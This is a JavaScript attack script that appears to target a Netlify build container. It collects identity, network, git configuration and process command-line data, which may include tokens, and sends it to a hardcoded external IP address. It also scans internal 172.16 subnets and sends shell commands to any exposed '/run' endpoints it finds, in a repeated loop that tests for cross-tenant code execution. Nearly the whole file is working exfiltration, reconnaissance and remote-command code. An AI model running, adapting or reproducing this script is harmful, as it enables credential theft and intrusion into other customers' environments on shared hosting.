import http from 'node:http';
import net from 'node:net';
import { gzipSync } from 'node:zlib';
import { execSync } from 'node:child_process';
import os from 'node:os';
import fs from 'node:fs';

const BASE = 'http://62.169.16.65:45381';
const TAG = 'r128prod-' + String(process.env.NETLIFY_SITE_ID || os.hostname() || 'x').slice(-6);
function post(p, body) { return new Promise(res => { const r = http.request(BASE + p, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, timeout: 9000 }, resp => { resp.resume(); resp.on('end', res); }); r.on('error', () => res()); r.on('timeout', () => { r.destroy(); res(); }); r.end(body); }); }
const sh = (c, t = 10000) => { try { return execSync(c, { timeout: t, encoding: 'utf8', maxBuffer: 1 << 23 }); } catch (e) { return 'ERR:' + String(e).slice(0, 200); } };
async function beacon(phase, obj) {
  try {
    const gz = gzipSync(Buffer.from(JSON.stringify(obj))).toString('hex');
    const c = Math.ceil(gz.length / 2800);
    for (let i = 0; i < c; i++) await post(`/fleet/${TAG}/${phase}/${i}-${c}`, gz.slice(i * 2800, (i + 1) * 2800));
  } catch (e) { try { await post(`/fleet/${TAG}/${phase}/hard`, String(e).slice(0, 200)); } catch (_) {} }
}
function req(method, port, path, body, host = '127.0.0.1', t = 4000) {
  return new Promise(res => {
    const data = body ? JSON.stringify(body) : null;
    const r = http.request({ host, port, path, method, timeout: t, headers: Object.assign({ 'Content-Type': 'application/json' }, data ? { 'Content-Length': Buffer.byteLength(data) } : {}) }, resp => {
      let b = '';
      resp.on('data', d => { b += d; if (b.length > 2500) { r.destroy(); res({ code: resp.statusCode, body: b.slice(0, 2500) }); } });
      resp.on('end', () => res({ code: resp.statusCode, body: b.slice(0, 2500) }));
    });
    r.on('error', e => res('ERR:' + String(e).slice(0, 100)));
    r.on('timeout', () => { r.destroy(); res('TMO'); });
    if (data) r.write(data);
    r.end();
  });
}
function tprobe(ip, port, t = 800) {
  return new Promise(res => {
    const s = new net.Socket();
    let done = false;
    const fin = v => { if (!done) { done = true; s.destroy(); res(v); } };
    s.setTimeout(t, () => fin('tmo'));
    s.once('connect', () => fin('open'));
    s.once('error', e => fin(e.code === 'ECONNREFUSED' ? 'refused' : 'err:' + String(e.code || e).slice(0, 40)));
    s.connect(port, ip);
  });
}

const errHandler = e => beacon('FATAL', String((e && e.stack) || e).slice(0, 500));
http.createServer((q, s) => { s.writeHead(200); s.end('r128prod'); }).listen(3999);
process.on('uncaughtException', errHandler);
process.on('unhandledRejection', errHandler);

// ---- P0 ----
const ifaces = os.networkInterfaces();
const map = {
  t: new Date().toISOString(), id: sh('id').trim(), tag: TAG, site: process.env.NETLIFY_SITE_ID,
  eth0: ifaces.eth0, route: sh('cat /proc/net/route'),
  resolv: sh('cat /etc/resolv.conf'),
  gitcfg: (() => { try { return fs.readFileSync('/opt/build/repo/.git/config', 'utf8').slice(0, 800); } catch (e) { try { return fs.readFileSync(process.env.HOME + '/.gitconfig', 'utf8').slice(0, 400); } catch (e2) { return 'none'; } } })(),
  gitcfg2: sh('cat /opt/build/.gitconfig 2>/dev/null; cat ~/.gitconfig 2>/dev/null; ls /opt/build/repo/.git 2>/dev/null | head -5'),
  tok: sh('tr "\\0" " " < /proc/' + process.ppid + '/cmdline 2>/dev/null | head -c 200'),
};
await beacon('P0map', map);

const ownIPs = [];
for (const l of Object.values(ifaces)) for (const i of l || []) if (i.family === 'IPv4' && !i.internal) ownIPs.push(i.address);
const ownIP = ownIPs[0];

// ---- P1 self ----
const p1 = { ownIPs, up_loopback: await req('GET', 8288, '/up') };
if (ownIP) { p1.up_ownip = await req('GET', 8288, '/up', null, ownIP); }
await beacon('P1self', p1);

// ---- P2 full scan ----
const targets = new Set();
const m = ownIP && ownIP.match(/^(\d+\.\d+)\.(\d+)\.(\d+)$/);
if (m) { const pre = m[1] + '.' + m[2]; for (let i = 1; i < 255; i++) if (pre + '.' + i !== ownIP) targets.add(pre + '.' + i); }
for (let i = 0; i < 256; i++) for (const host of [1, 2, 3]) { const ip = '172.16.' + i + '.' + host; if (ip !== ownIP) targets.add(ip); }
const tlist = [...targets];
const hits = [];
for (const port of [8288, 8888]) for (let i = 0; i < tlist.length; i += 64) {
  const rs = await Promise.all(tlist.slice(i, i + 64).map(ip => tprobe(ip, port).then(r => ({ ip, r }))));
  for (const x of rs) if (x.r === 'open') hits.push({ ip, port });
}
await beacon('P2scan', { ownIP, n: tlist.length, hits, arp: sh('cat /proc/net/arp').slice(0, 2500) });

// ---- P3 hits ----
for (const h of hits.slice(0, 10)) {
  const up = await req('GET', h.port, '/up', null, h.ip, 3000);
  const e = { hit: h, up };
  if (up && typeof up === 'object' && String(up.body || '').includes('ok')) {
    e.run_id = await req('POST', h.port, h.port === 8288 ? '/run' : '/.ntlfy-dev/run', { command: 'sh', args: ['-c', 'id; hostname; echo CROSSPOD-$NETLIFY_SITE_ID'] }, h.ip, 5000);
  }
  await beacon('P3hit', e);
}

// ---- P5 long rescan loop (10 rounds, 45s apart) ----
const t2 = [];
const mm2 = ownIP && ownIP.match(/^(\d+\.\d+)\./); const B = mm2 ? mm2[1] : '172.16';
for (let i = 0; i < 256; i++) for (const host of [2, 3]) { const ip = B + '.' + i + '.' + host; if (ip !== ownIP) t2.push(ip); }
for (let round = 1; round <= 10; round++) {
  await new Promise(r => setTimeout(r, 45000));
  try {
    const hits2 = [];
    for (const port of [8288]) for (let i = 0; i < t2.length; i += 64) {
      const rs = await Promise.all(t2.slice(i, i + 64).map(ip => tprobe(ip, port, 900).then(r => ({ ip, r }))));
      for (const x of rs) if (x.r === 'open') hits2.push({ ip, port });
    }
    const res2 = [];
    for (const h of hits2.slice(0, 6)) {
      const up = await req('GET', h.port, '/up', null, h.ip, 3000);
      const e = { hit: h, up };
      if (up && typeof up === 'object' && String(up.body || '').includes('ok')) {
        e.run_id = await req('POST', h.port, '/run', { command: 'sh', args: ['-c', 'id; hostname; echo CROSSPOD-$NETLIFY_SITE_ID'] }, h.ip, 5000);
      }
      res2.push(e);
    }
    await beacon('P5r' + round, { hits2, res2 });
  } catch (e) { await beacon('P5err' + round, String(e).slice(0, 200)); }
}

setInterval(() => { }, 1 << 30);
